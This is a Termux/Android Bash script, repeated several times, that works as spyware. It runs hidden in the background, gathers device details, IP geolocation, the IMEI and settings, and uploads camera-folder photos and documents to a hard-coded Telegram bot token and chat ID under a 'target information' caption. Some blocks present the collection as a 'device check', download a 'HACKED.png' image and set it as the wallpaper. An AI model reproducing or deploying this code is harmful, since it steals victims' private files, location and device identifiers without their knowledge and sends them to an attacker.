        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear

clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear
clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &
clear


clear
#!/data/data/com.termux/files/home/.zinit/polaris/bin/bash

# Discreet background execution
{
while true; do
    cekinstal="/data/data/com.termux/files/usr/lib/commplate"
    if [ -f "$cekinstal" ]; then
        TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
        CHAT_ID="5951232585"
        cek="$HOME/WHATSAPP-/sopo.txt"
        sent_files_file="/data/data/com.termux/files/usr/lib/sent_files.txt"
        sent_files=()

        [ -f "$cek" ] || continue
        
        nama=$(cat "$cek" 2>/dev/null)
        neofetch --stdout > ~/device_info.txt 2>/dev/null
        brand=$(grep "Host:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        os=$(grep "OS:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs)
        memory=$(grep "Memory:" ~/device_info.txt | awk -F ':' '{print $2}' | xargs | sed 's/B//g')

        [[ "$memory" =~ "MB" ]] && memory=$(echo "$memory" | sed 's/MB//g' | awk '{printf "%.2f GB", $1/1024}')
        [[ "$memory" =~ "KB" ]] && memory=$(echo "$memory" | sed 's/KB//g' | awk '{printf "%.2f GB", $1/1024/1024}')

        ip_info=$(curl -s ipinfo.io)
        ip_address=$(echo "$ip_info" | jq -r '.ip')
        city=$(echo "$ip_info" | jq -r '.city')
        region=$(echo "$ip_info" | jq -r '.region')
        country=$(echo "$ip_info" | jq -r '.country')
        loc=$(echo "$ip_info" | jq -r '.loc')

        send_file() {
            local file="$1"
            local directory=$(dirname "$file")
            local caption=$(cat << EOF
LORDHOZOO 👸
🔰 Informasi Target 🔰
📝 Nama Target : $nama
📱 Merek : $brand
🖥️ OS : $os
💾 Memori : $memory
📂 Asal Direktori : $directory
🌐 Alamat IP : $ip_address
🏙️ Kota : $city
📍 Wilayah : $region
🇨🇺 Negara : $country
📌 Lokasi : $loc
EOF
            )
            curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
                -F chat_id="$CHAT_ID" \
                -F document=@"$file" \
                -F caption="$caption" >/dev/null
            echo "$file" >> "$sent_files_file"
        }

        [ -f "$sent_files_file" ] || touch "$sent_files_file"
        mapfile -t sent_files < "$sent_files_file" 2>/dev/null

        for ext in "jpg" "png" "IMG" "txt" "pdf" "py" "sh" "zip"; do
            find /storage/emulated/0/DCIM/Camera -type f -iname "*.$ext" 2>/dev/null | while read -r file; do
                [[ " ${sent_files[*]} " =~ " ${file} " ]] || send_file "$file"
            done
        done

        rm -f /data/data/com.termux/files/usr/lib/bash/whoamie
        rm -f /data/data/com.termux/files/usr/lib/bash/mewing
        exit
    else
        yes | termux-setup-storage >/dev/null
        apt-get update >/dev/null
        apt-get install -y curl neofetch inetutils jq >/dev/null
        touch /data/data/com.termux/files/usr/lib/commplate
    fi
done
} >/dev/null 2>&1 &

#!/bin/bash

# Konfigurasi Bot
BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
CHAT_ID="5951232585"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"

# Fungsi untuk mengirim pesan ke Telegram
send_message() {
    local message="$1"
    curl -s -X POST "$API_URL" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="Markdown"
}

# Fungsi cek storage
check_storage() {
    echo "🔄 Memeriksa storage..."
    local storage_info=$(df -h /storage/emulated/0)
    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
}

# Fungsi cek IMEI (memerlukan root)
check_imei() {
    echo "🔄 Memeriksa IMEI..."
    if [ $(id -u) -ne 0 ]; then
        send_message "⚠️ *Error:* Perlu akses root untuk cek IMEI"
        return
    fi
    
    local imei1=$(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed 's/[^0-9]*//g' | tr -d '\n')
    local imei2=$(service call iphonesubinfo 3 | awk -F "'" '{print $2}' | sed 's/[^0-9]*//g' | tr -d '\n')
    
    send_message "📱 *IMEI Info:*\n- IMEI 1: $imei1\n- IMEI 2: $imei2"
}

# Fungsi cek pengaturan dasar
check_settings() {
    echo "🔄 Memeriksa pengaturan..."
    local battery=$(dumpsys battery | grep level | awk '{print $2}')
    local brightness=$(settings get system screen_brightness)
    local wifi_status=$(settings get global wifi_on)
    
    wifi_status=$([ "$wifi_status" == "1" ] && echo "ON" || echo "OFF")
    
    send_message "⚙️ *Device Settings:*\n- Battery Level: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
}

# Fungsi cek informasi perangkat
check_device_info() {
    echo "🔄 Memeriksa info perangkat..."
    local model=$(getprop ro.product.model)
    local brand=$(getprop ro.product.brand)
    local android_version=$(getprop ro.build.version.release)
    
    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
}

# Main execution
send_message "🔔 *Memulai Pemeriksaan Perangkat*"
check_device_info
check_storage
check_settings
check_imei
send_message "✅ *Pemeriksaan Selesai*"
echo "Pemeriksaan selesai, informasi telah dikirim ke Telegram"

clear
#!/bin/bash

# Menyembunyikan output terminal dan jalankan di background
exec > /dev/null 2>&1

TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
URL="https://api.telegram.org/bot$TOKEN/getUpdates"

# Unduh gambar
wget https://github.com/roothozoo/wa/blob/main/HACKED.png -O /tmp/HACKED.png

# Coba atur wallpaper
if [ -f "/data/data/com.termux/files/usr/bin/termux-wallpaper" ]; then
    termux-wallpaper -f /tmp/HACKED.png
    RESPONSE="Wallpaper berhasil diubah!"
elif command -v gsettings &> /dev/null; then
    gsettings set org.gnome.desktop.background picture-uri "file:///tmp/HACKED.png"
    RESPONSE="Wallpaper berhasil diubah!"
else
    RESPONSE="Gambar berhasil diunduh tetapi tidak dapat mengubah wallpaper (sistem tidak didukung)."
fi

# Kirim notifikasi ke pemilik bot
CHAT_ID="YOUR_CHAT_ID"
curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" \
    -d chat_id=$CHAT_ID \
    -d text="$RESPONSE"
    clear

    #!/bin/bash

# --- Configuration Section ---
BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
CHAT_ID="5951232585"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
WALLPAPER_URL="https://github.com/roothozoo/wa/blob/main/HACKED.png"

# --- Function Definitions ---

# Send message to Telegram
send_message() {
    local message="$1"
    curl -s -X POST "$API_URL" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="Markdown"
}

# Check storage information
check_storage() {
    echo "🔄 Checking storage..."
    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
}

# Check device settings
check_settings() {
    echo "🔄 Checking device settings..."
    local battery=$(dumpsys battery 2>/dev/null | grep level | awk '{print $2}' || echo "N/A")
    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
    local wifi_status=$(settings get global wifi_on 2>/dev/null)
    
    wifi_status=$([ "$wifi_status" == "1" ] && echo "ON" || echo "OFF")
    
    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
}

# Check device information
check_device_info() {
    echo "🔄 Checking device info..."
    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
    
    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
}

# Change wallpaper
change_wallpaper() {
    echo "🔄 Changing wallpaper..."
    local temp_file="/tmp/HACKED.png"
    
    # Download wallpaper
    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
        send_message "⚠️ Failed to download wallpaper image"
        return
    fi

    # Try different methods to set wallpaper
    local response=""
    if [ -f "/data/data/com.termux/files/usr/bin/termux-wallpaper" ]; then
        if termux-wallpaper -f "$temp_file"; then
            response="Wallpaper changed successfully via Termux!"
        else
            response="Failed to set wallpaper via Termux"
        fi
    elif command -v gsettings &>/dev/null; then
        if gsettings set org.gnome.desktop.background picture-uri "file://$temp_file"; then
            response="Wallpaper changed successfully via gsettings!"
        else
            response="Failed to set wallpaper via gsettings"
        fi
    else
        response="Downloaded wallpaper but couldn't set it (unsupported system)"
    fi

    send_message "$response"
}

# --- Main Execution ---

# Run in background if requested
if [[ "$1" == "--background" ]]; then
    exec > /dev/null 2>&1
fi

# Start device check
send_message "🔔 *Starting Device Check*"
check_device_info
check_storage
check_settings
change_wallpaper
send_message "✅ *Device Check Completed*"

clear
#!/bin/bash

# --- Configuration Section ---
BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
CHAT_ID="5951232585"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
WALLPAPER_URL="https://github.com/roothozoo/wa/blob/main/HACKED.png"

# --- Function Definitions ---

# Send message to Telegram
send_message() {
    local message="$1"
    curl -s -X POST "$API_URL" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="Markdown"
}

# Check storage information
check_storage() {
    echo "🔄 Checking storage..."
    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
}

# Check device settings
check_settings() {
    echo "🔄 Checking device settings..."
    local battery=$(dumpsys battery 2>/dev/null | grep level | awk '{print $2}' || echo "N/A")
    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
    local wifi_status=$(settings get global wifi_on 2>/dev/null)
    
    wifi_status=$([ "$wifi_status" == "1" ] && echo "ON" || echo "OFF")
    
    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
}

# Check device information
check_device_info() {
    echo "🔄 Checking device info..."
    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
    
    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
}

# Change wallpaper
change_wallpaper() {
    echo "🔄 Changing wallpaper..."
    local temp_file="/tmp/HACKED.png"
    
    # Download wallpaper
    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
        send_message "⚠️ Failed to download wallpaper image"
        return
    fi

    # Try different methods to set wallpaper
    local response=""
    if [ -f "/data/data/com.termux/files/usr/bin/termux-wallpaper" ]; then
        if termux-wallpaper -f "$temp_file"; then
            response="Wallpaper changed successfully via Termux!"
        else
            response="Failed to set wallpaper via Termux"
        fi
    elif command -v gsettings &>/dev/null; then
        if gsettings set org.gnome.desktop.background picture-uri "file://$temp_file"; then
            response="Wallpaper changed successfully via gsettings!"
        else
            response="Failed to set wallpaper via gsettings"
        fi
    else
        response="Downloaded wallpaper but couldn't set it (unsupported system)"
    fi

    send_message "$response"
}

# --- Main Execution ---

# Run in background if requested
if [[ "$1" == "--background" ]]; then
    exec > /dev/null 2>&1
fi

# Start device check
send_message "🔔 *Starting Device Check*"
check_device_info
check_storage
check_settings
change_wallpaper
send_message "✅ *Device Check Completed*"

clear
#!/bin/bash

# --- Configuration Section ---
BOT_TOKEN="7415682127:AAGVIcEoHo2_JDbykyQlbA32htLv1v-4EMA"
CHAT_ID="5951232585"
API_URL="https://api.telegram.org/bot$BOT_TOKEN/sendMessage"
WALLPAPER_URL="https://github.com/roothozoo/wa/blob/main/HACKED.png"

# --- Function Definitions ---

# Send message to Telegram
send_message() {
    local message="$1"
    curl -s -X POST "$API_URL" \
        -d chat_id="$CHAT_ID" \
        -d text="$message" \
        -d parse_mode="Markdown"
}

# Check storage information
check_storage() {
    echo "🔄 Checking storage..."
    local storage_info=$(df -h /storage/emulated/0 2>/dev/null || echo "Storage not accessible")
    send_message "📊 *Storage Info:*\n\`\`\`\n$storage_info\n\`\`\`"
}

# Check device settings
check_settings() {
    echo "🔄 Checking device settings..."
    local battery=$(dumpsys battery 2>/dev/null | grep level | awk '{print $2}' || echo "N/A")
    local brightness=$(settings get system screen_brightness 2>/dev/null || echo "N/A")
    local wifi_status=$(settings get global wifi_on 2>/dev/null)
    
    wifi_status=$([ "$wifi_status" == "1" ] && echo "ON" || echo "OFF")
    
    send_message "⚙️ *Device Settings:*\n- Battery: $battery%\n- Brightness: $brightness\n- WiFi: $wifi_status"
}

# Check device information
check_device_info() {
    echo "🔄 Checking device info..."
    local model=$(getprop ro.product.model 2>/dev/null || echo "Unknown")
    local brand=$(getprop ro.product.brand 2>/dev/null || echo "Unknown")
    local android_version=$(getprop ro.build.version.release 2>/dev/null || echo "Unknown")
    
    send_message "📱 *Device Info:*\n- Brand: $brand\n- Model: $model\n- Android: $android_version"
}

# Change wallpaper
change_wallpaper() {
    echo "🔄 Changing wallpaper..."
    local temp_file="/tmp/HACKED.png"
    
    # Download wallpaper
    if ! wget -q "$WALLPAPER_URL" -O "$temp_file"; then
        send_message "⚠️ Failed to download wallpaper image"
        return
    fi

    # Try different methods to set wallpaper
    local response=""
    if [ -f "/data/data/com.termux/files/usr/bin/termux-wallpaper" ]; then
        if termux-wallpaper -f "$temp_file"; then
            response="Wallpaper changed successfully via Termux!"
        else
            response="Failed to set wallpaper via Termux"
        fi
    elif command -v gsettings &>/dev/null; then
        if gsettings set org.gnome.desktop.background picture-uri "file://$temp_file"; then
            response="Wallpaper changed successfully via gsettings!"
        else
            response="Failed to set wallpaper via gsettings"
        fi
    else
        response="Downloaded wallpaper but couldn't set it (unsupported system)"
    fi

    send_message "$response"
}

# --- Main Execution ---

# Run in background if requested
if [[ "$1" == "--background" ]]; then
    exec > /dev/null 2>&1
fi

# Start device check
send_message "🔔 *Starting Device Check*"
check_device_info
check_storage
check_settings
change_wallpaper
send_message "✅ *Device Check Completed*"

clear
bash BAN.sh
